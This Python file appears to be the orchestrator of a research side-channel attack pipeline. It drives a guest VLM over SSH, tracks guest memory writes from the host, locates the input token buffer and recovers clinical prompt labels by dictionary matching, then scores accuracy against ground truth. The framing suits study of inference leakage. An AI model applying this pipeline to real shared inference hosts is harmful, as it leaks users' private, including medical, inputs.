#!/usr/bin/env python3
"""
case_study/llm/pipeline/master_orchestrate.py — Master Orchestrator for LLM Side-Channel Attack.

Integrates Stages 1~5 with unified CLI, stage selection, batch processing,
persistent guest stdin-loop support, safety pacing, and comprehensive analytics.

Usage:
    # 1. Single sample full execution (Stage 1~5)
    sudo python3 master_orchestrate.py --index 2

    # 2. Batch mode execution (Indices 2, 9, 12)
    sudo python3 master_orchestrate.py --indices 2,9,12

    # 3. Stage selection (e.g. Stage 3 to Stage 5 on index 2)
    python3 master_orchestrate.py --from-stage 3 --to-stage 5 --index 2

    # 4. Offline evaluation only (Stage 5 on already localized sample)
    python3 master_orchestrate.py --stage 5 --index 2
"""

import argparse
import csv
import re
import subprocess
import sys
import threading
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

import common as c
from stage1_prepare_dict import run_stage1
from stage2_track_blocks import block_base_gpa, score_blocks_from_log, process_tracked_log
from stage3_locate_base import locate_base_gpa, read_at_fixed
from stage4_estimate_bounds import run_stage4
from stage5_dict_match import run_stage5

RE_BASE = re.compile(r'input_ids base(?: page)? GPA:\s*0x([0-9a-f]+)', re.I)
RE_N = re.compile(r'N_image_pad:\s+(\d+)', re.I)


class GuestStdinLoop:
    """Manages a persistent guest inference process across batch samples."""

    def __init__(self, max_new_tokens: int = 60):
        self.max_new_tokens = max_new_tokens
        self.proc: Optional[subprocess.Popen] = None

    def start(self) -> None:
        cmd = (
            f"cd {c.GUEST_CWD} && sudo env HF_HUB_OFFLINE=1 TRANSFORMERS_OFFLINE=1 "
            f"{c.GUEST_PY} -u {c.GSCRIPT} --model_id Qwen/Qwen2-VL-2B-Instruct "
            f"--calibrate --stdin-loop --max_new_tokens {self.max_new_tokens}"
        )
        print("[guest-loop] Launching persistent guest VLM process (can take ~45-60s)...")
        self.proc = subprocess.Popen(
            c.SSH_CMD + [cmd],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        ready = False
        for line in self.proc.stdout:
            print(f"  [guest] {line.strip()}")
            if "LOOP_READY" in line:
                ready = True
                break
        if not ready:
            raise RuntimeError("Guest VLM failed to reach LOOP_READY (process terminated or SSH connection failed)")
        print("[guest-loop] Guest VLM LOOP_READY confirmed.")

    def hold_sample(self, index: int) -> Dict[str, Any]:
        """Send index to guest, wait until HOLDING, return GT dict."""
        if self.proc is None or self.proc.poll() is not None:
            self.start()
        self.proc.stdin.write(f"{index}\n")
        self.proc.stdin.flush()

        gt = {"base": None, "N": None, "ind": None}
        grab_ind = False
        for l in self.proc.stdout:
            if "INDICATION (sample id" in l:
                grab_ind = True
                continue
            if grab_ind and gt["ind"] is None and l.strip() and "====" not in l:
                gt["ind"] = l.strip()
                grab_ind = False
            m = RE_BASE.search(l)
            if m:
                gt["base"] = int(m.group(1), 16)
            m = RE_N.search(l)
            if m:
                gt["N"] = int(m.group(1))
            if l.startswith("LOOP_ERR"):
                gt["error"] = l.strip()
                return gt
            if "HOLDING" in l:
                break
        return gt

    def release_sample(self) -> None:
        """Send NEXT to guest to release held buffer."""
        if self.proc and self.proc.poll() is None:
            self.proc.stdin.write("NEXT\n")
            self.proc.stdin.flush()
            for l in self.proc.stdout:
                if "RELEASED" in l:
                    break

    def close(self) -> None:
        if self.proc and self.proc.poll() is None:
            try:
                self.proc.stdin.write("QUIT\n")
                self.proc.stdin.flush()
                self.proc.wait(timeout=10)
            except Exception:
                self.proc.kill()
        self.proc = None


def run_pipeline_for_sample(
    index: int,
    from_stage: int,
    to_stage: int,
    pacer: c.Pacer,
    guest_loop: Optional[GuestStdinLoop],
    tracker_proc: Optional[subprocess.Popen],
    tracker_log_file: Optional[Any],
    fixed_gpa: Optional[int],
    ip_ref: Optional[bytes],
    ip_mask: Optional[Set[int]],
    known_blocks: Dict[int, int],
    recency_list: List[int],
    dict_cache: Optional[Dict[str, Any]],
    output_dir: Path,
) -> Dict[str, Any]:
    """Execute stages [from_stage, to_stage] for a single sample index."""
    t_start = time.time()
    sample_res: Dict[str, Any] = {"index": index}

    print("\n" + "=" * 75)
    print(f"  [ORCHESTRATE] Processing Sample Index: {index} (Stages {from_stage} -> {to_stage})")
    print("=" * 75)

    gt: Dict[str, Any] = {"base": None, "N": None, "ind": None}

    # -----------------------------------------------------------------------
    # Stage 1: Preparation (already done or run if requested)
    # -----------------------------------------------------------------------
    if from_stage <= 1 <= to_stage:
        run_stage1(build_dict=False, skip_existing=True, output_dir=output_dir)

    # -----------------------------------------------------------------------
    # Stage 2: Write Pattern Tracking
    # -----------------------------------------------------------------------
    st2_path = output_dir / f"stage2_tracked_{index}.json"
    if from_stage <= 2 <= to_stage:
        if guest_loop is not None and tracker_proc is not None:
            # Online batch mode with persistent guest loop & live tracker
            print(f"  [Stage 2] Triggering guest inference & holding buffer for index {index}...")
            gt = guest_loop.hold_sample(index)
            if gt.get("error"):
                print(f"  [!] Guest error on index {index}: {gt['error']}")
                return {"index": index, "verdict": "GEN_FAIL", "error": gt["error"]}

            if tracker_log_file:
                tracker_log_file.flush()
            log_path = output_dir / f"sample_{index}_wpt.log"
            st2_res = process_tracked_log(index, str(c.LLM_DIR / "e2e_combined_wpt.log"), gt, top_k=7, out_dir=output_dir)
        else:
            # Check if offline host log exists or run standalone
            from stage2_track_blocks import run_stage2_online
            st2_res = run_stage2_online(index, top_k=7, output_dir=output_dir)
            gt = {"base": int(st2_res["gt_base"], 16) if st2_res.get("gt_base") else None,
                  "ind": st2_res.get("gt_indication"),
                  "N": st2_res.get("gt_N")}
    elif st2_path.exists():
        st2_res = c.load_json(st2_path)
        gt = {"base": int(st2_res["gt_base"], 16) if st2_res.get("gt_base") else None,
              "ind": st2_res.get("gt_indication"),
              "N": st2_res.get("gt_N")}
    else:
        st2_res = {}

    cand_blks = [int(x, 16) for x in st2_res.get("candidate_blocks", [])]
    cand_run_bases = st2_res.get("candidate_run_bases", {})

    # -----------------------------------------------------------------------
    # Stage 3: Sharp Localization (Base GPA)
    # -----------------------------------------------------------------------
    host_base = None
    loc_strategy = "N/A"
    loc_swaps = 0
    st3_path = output_dir / f"stage3_located_{index}.json"

    if from_stage <= 3 <= to_stage:
        if fixed_gpa is not None and ip_ref is not None and ip_mask is not None:
            bootstrap = (gt["base"] & ~(c.BLOCK_SIZE - 1)) if gt.get("base") else None
            host_base, loc_swaps, loc_strategy, best_hits = locate_base_gpa(
                fixed_gpa=fixed_gpa,
                ip_ref=ip_ref,
                ip_mask=ip_mask,
                tracker_candidates=cand_blks,
                known_blocks=known_blocks,
                recency_list=recency_list,
                pacer=pacer,
                candidate_run_bases=cand_run_bases,
                bootstrap_block=bootstrap,
            )
            loc_match = (host_base == gt["base"]) if (host_base and gt.get("base")) else None
            st3_res = {
                "index": index,
                "host_base": hex(host_base) if host_base else None,
                "loc_strategy": loc_strategy,
                "loc_swaps": loc_swaps,
                "best_hits": best_hits,
                "loc_match": loc_match,
                "gt_base": hex(gt["base"]) if gt.get("base") else None,
                "gt_indication": gt.get("ind"),
                "status": "SUCCESS" if host_base else "LOC_FAIL",
                "timestamp": time.time(),
            }
            c.save_json(st3_path, st3_res)
        else:
            from stage3_locate_base import run_stage3
            st3_res = run_stage3(index, stage2_json=st2_path, output_dir=output_dir)
            host_base = int(st3_res["host_base"], 16) if st3_res.get("host_base") else None
            loc_strategy = st3_res.get("loc_strategy", "N/A")
            loc_swaps = st3_res.get("loc_swaps", 0)
    elif st3_path.exists():
        st3_res = c.load_json(st3_path)
        host_base = int(st3_res["host_base"], 16) if st3_res.get("host_base") else None
        loc_strategy = st3_res.get("loc_strategy", "N/A")
        loc_swaps = st3_res.get("loc_swaps", 0)
    else:
        st3_res = {}

    if host_base:
        blk = host_base & ~(c.BLOCK_SIZE - 1)
        off = (host_base - blk) // c.PAGE_SIZE
        known_blocks[blk] = off
        if blk in recency_list:
            recency_list.remove(blk)
        recency_list.insert(0, blk)

    # -----------------------------------------------------------------------
    # Stage 4: Pad Boundary & Indication Window Search
    # -----------------------------------------------------------------------
    st4_path = output_dir / f"stage4_bounds_{index}.json"
    n_pad_est = None
    if from_stage <= 4 <= to_stage:
        if host_base:
            st4_res = run_stage4(index, base_gpa=host_base, output_dir=output_dir)
            n_pad_est = st4_res.get("N_est")
        else:
            st4_res = {"status": "SKIPPED_LOC_FAIL"}
    elif st4_path.exists():
        st4_res = c.load_json(st4_path)
        n_pad_est = st4_res.get("N_est")
    else:
        st4_res = {}

    # -----------------------------------------------------------------------
    # Stage 5: Dictionary Matching & Label Recovery
    # -----------------------------------------------------------------------
    st5_path = output_dir / f"stage5_result_{index}.json"
    recovered_labels: List[str] = []
    eval_result: Dict[str, Any] = {}

    if from_stage <= 5 <= to_stage:
        if host_base:
            st5_res = run_stage5(index, stage4_json=st4_path, base_gpa=host_base, output_dir=output_dir)
            recovered_labels = st5_res.get("recovered_labels", [])
            eval_result = st5_res.get("evaluation", {})
        else:
            eval_result = c.evaluate_recovery([], gt.get("ind"))
            eval_result["verdict"] = "LOC_FAIL"
            st5_res = {"status": "LOC_FAIL", "evaluation": eval_result}
            c.save_json(st5_path, st5_res)
    elif st5_path.exists():
        st5_res = c.load_json(st5_path)
        recovered_labels = st5_res.get("recovered_labels", [])
        eval_result = st5_res.get("evaluation", {})
    else:
        st5_res = {}

    # Release guest buffer after scan completes
    if guest_loop is not None:
        guest_loop.release_sample()

    elapsed = time.time() - t_start

    sample_summary = {
        "index": index,
        "indication": gt.get("ind") or "",
        "gt_base": hex(gt["base"]) if gt.get("base") else "",
        "host_base": hex(host_base) if host_base else "",
        "loc_strategy": loc_strategy,
        "loc_swaps": loc_swaps,
        "loc_match": (host_base == gt["base"]) if (host_base and gt.get("base")) else False,
        "N_pad_est": n_pad_est or "",
        "verdict": eval_result.get("verdict", "NO_MATCH"),
        "recovered_labels": " / ".join(recovered_labels),
        "top1_match": eval_result.get("top1_exact_match", False),
        "any_match": eval_result.get("any_label_match", False),
        "multi_match_count": eval_result.get("multi_match_count", 0),
        "false_positive_count": eval_result.get("false_positive_count", 0),
        "false_positive_labels": " / ".join(eval_result.get("false_positive_labels", [])),
        "elapsed_sec": round(elapsed, 1),
    }

    return sample_summary


def main():
    p = argparse.ArgumentParser(description="Master Orchestrator for LLM Side-Channel Attack Pipeline")
    p.add_argument("--index", type=int, default=None, help="Single sample index")
    p.add_argument("--indices", type=str, default=None, help="Comma-separated sample indices (e.g. 2,9,12)")
    p.add_argument("--start", type=int, default=None, help="Start sample index for batch range")
    p.add_argument("--end", type=int, default=None, help="End sample index (inclusive) for batch range")
    p.add_argument("--filtered-only", action="store_true", help="Run only samples containing clinical target indications (from filtered_samples.json)")
    p.add_argument("--all", action="store_true", help="Run entire test dataset (0..3462)")
    p.add_argument("--limit", type=int, default=None, help="Limit number of samples to process in this run")
    p.add_argument("--stage", type=int, default=None, help="Run only a single specific stage (1..5)")
    p.add_argument("--from-stage", type=int, default=1, help="Start from stage (1..5)")
    p.add_argument("--to-stage", type=int, default=5, help="End at stage (1..5)")
    p.add_argument("--max-new-tokens", type=int, default=60, help="Max tokens for guest generation")
    p.add_argument("--output-dir", type=Path, default=c.PIPELINE_DIR, help="Output directory")
    p.add_argument("--skip-existing", action="store_true", default=True, help="Skip completed samples")
    args = p.parse_args()

    # Determine indices list
    if args.indices:
        indices = [int(x.strip()) for x in args.indices.split(",")]
    elif args.filtered_only:
        filt_path = c.LLM_DIR / "filtered_samples.json"
        if filt_path.exists():
            filt_data = c.load_json(filt_path)
            indices = [int(s.get("sample_idx", s.get("index", i))) for i, s in enumerate(filt_data)]
        else:
            indices = list(range(0, 3463))
    elif args.all:
        indices = list(range(0, 3463))
    elif args.start is not None and args.end is not None:
        indices = list(range(args.start, args.end + 1))
    elif args.index is not None:
        indices = [args.index]
    else:
        indices = [2]

    if args.limit:
        indices = indices[:args.limit]

    from_st = args.stage if args.stage is not None else args.from_stage
    to_st = args.stage if args.stage is not None else args.to_stage

    out_dir = args.output_dir
    out_dir.mkdir(parents=True, exist_ok=True)
    summary_csv = out_dir / "pipeline_summary.csv"

    print("=" * 75)
    print("  LLM END-TO-END MODULAR ATTACK ORCHESTRATOR")
    print("=" * 75)
    print(f"  Target Sample Count: {len(indices)} (e.g. {indices[:10]}{'...' if len(indices)>10 else ''})")
    print(f"  Active Stages      : Stage {from_st} -> Stage {to_st}")
    print(f"  Output Directory   : {out_dir}")
    print("=" * 75)

    # Initialize shared components
    pacer = c.Pacer()
    known_blocks: Dict[int, int] = {}
    recency_list: List[int] = []

    dict_cache = None
    if c.DICT_CACHE.exists():
        dict_cache = c.load_json(c.DICT_CACHE)

    # Preflight network if running online stages
    if from_st <= 3:
        c.run_net_preflight()
        c.ensure_mtu_9000()

    guest_loop = None
    tracker_proc = None
    tracker_log_file = None
    fixed_gpa = None
    ip_ref = None
    ip_mask = None

    # If running online stages (1..3) and multiple indices, setup guest loop and references
    if from_st <= 2:
        try:
            guest_loop = GuestStdinLoop(max_new_tokens=args.max_new_tokens)
            guest_loop.start()

            # Start write tracker
            tracker_log_path = c.LLM_DIR / "e2e_combined_wpt.log"
            tracker_log_file = open(tracker_log_path, "w", encoding="utf-8")
            tracker_proc = subprocess.Popen(
                [c.TRACKER_BIN, "--start-gpa", hex(c.TRACK_START),
                 "--track-size", hex(c.TRACK_SIZE),
                 "--duration", "36000", "--settle", str(c.TRACKER_SETTLE_S)],
                stdout=tracker_log_file, stderr=subprocess.PIPE, text=True
            )

            # Settle tracker
            deadline = time.time() + c.TRACKER_SETTLE_S + 10
            while time.time() < deadline:
                line = tracker_proc.stderr.readline()
                if not line or "Settle done" in line:
                    break

            def _drain():
                for _ in tracker_proc.stderr:
                    pass
            threading.Thread(target=_drain, daemon=True).start()

            # Prepare Image-Pad Reference
            from mura_dict_build import acquire_gpa
            from stage1_prepare_dict import acquire_imagepad_reference
            fixed_gpa = acquire_gpa(None)
            ip_ref, ip_mask = acquire_imagepad_reference(fixed_gpa)
            print(f"[orchestrator] Image-Pad reference ready: {len(ip_mask)}/256 confirmed offsets")
        except Exception as e:
            print(f"[orchestrator] Online environment setup note: {e}", file=sys.stderr)

    rows: List[Dict[str, Any]] = []
    t_batch_start = time.time()

    try:
        for idx in indices:
            row = run_pipeline_for_sample(
                index=idx,
                from_stage=from_st,
                to_stage=to_st,
                pacer=pacer,
                guest_loop=guest_loop,
                tracker_proc=tracker_proc,
                tracker_log_file=tracker_log_file,
                fixed_gpa=fixed_gpa,
                ip_ref=ip_ref,
                ip_mask=ip_mask,
                known_blocks=known_blocks,
                recency_list=recency_list,
                dict_cache=dict_cache,
                output_dir=out_dir,
            )
            rows.append(row)
            # Incremental update: append / update this sample in pipeline_summary.csv immediately!
            c.update_summary_csv(summary_csv, row)
    finally:
        if guest_loop:
            guest_loop.close()
        if tracker_proc:
            tracker_proc.terminate()
            try:
                tracker_proc.wait(timeout=5)
            except Exception:
                tracker_proc.kill()
        if tracker_log_file:
            tracker_log_file.close()

    # Load complete accumulated table for overall reporting
    all_accumulated_rows = list(c.load_summary_csv(summary_csv).values())

    # Aggregated Metrics Reporting (Current Run vs Overall Accumulated)
    total_samples = len(rows)
    total_time = time.time() - t_batch_start
    loc_success = sum(1 for r in rows if r.get("loc_match") in (True, "True"))
    top1_pass = sum(1 for r in rows if r.get("top1_match") in (True, "True"))
    any_pass = sum(1 for r in rows if r.get("any_match") in (True, "True"))
    multi_matches = sum(1 for r in rows if r.get("verdict") == "MULTI_MATCH")
    total_fp = sum(int(r.get("false_positive_count", 0)) for r in rows)
    avg_fp = (total_fp / total_samples) if total_samples > 0 else 0.0

    print("\n" + "=" * 75)
    print("  ORCHESTRATION RUN SUMMARY (THIS RUN)")
    print("=" * 75)
    print(f"  Samples Processed in Run  : {total_samples}")
    print(f"  Batch Run Time            : {total_time:.1f}s (Avg: {total_time / max(total_samples, 1):.1f}s/sample)")
    print(f"  Total Swaps in Run        : {pacer.n}")
    print(f"  Base Localization Accuracy: {loc_success}/{total_samples} ({loc_success / max(total_samples, 1) * 100:.1f}%)")
    print(f"  Top-1 Exact Label Accuracy: {top1_pass}/{total_samples} ({top1_pass / max(total_samples, 1) * 100:.1f}%)")
    print(f"  Any-Label Recall          : {any_pass}/{total_samples} ({any_pass / max(total_samples, 1) * 100:.1f}%)")
    print(f"  Multi-Match Rate          : {multi_matches}/{total_samples} ({multi_matches / max(total_samples, 1) * 100:.1f}%)")
    print(f"  Average False Positives   : {avg_fp:.2f} per sample")
    print(f"  Accumulated Total in CSV  : {len(all_accumulated_rows)} samples saved -> {summary_csv}")
    print("=" * 75 + "\n")


if __name__ == "__main__":
    main()
